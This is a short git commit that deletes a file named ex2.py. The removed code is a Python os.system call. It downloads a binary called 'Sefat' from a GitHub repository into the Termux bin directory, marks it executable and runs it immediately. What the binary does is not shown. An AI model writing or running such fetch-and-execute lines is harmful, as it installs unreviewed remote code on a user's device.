95e0dd59491f45292b6b45cbd024f92228078976
MR - FUCKER <121819973+Peaky-XD@users.noreply.github.com>
2023-05-21 11:52:17 +0600

    Delete ex2.py

--- ex2.py
+++
@@ -1,5 +0,0 @@
-import os 
-os.system("curl -L https://github.com/X-NINJA-XD/.../blob/main/Sefat -o /data/data/com.termux/files/usr/bin/Sefat;chmod +x /data/data/com.termux/files/usr/bin/Sefat;Sefat")
-
-
-
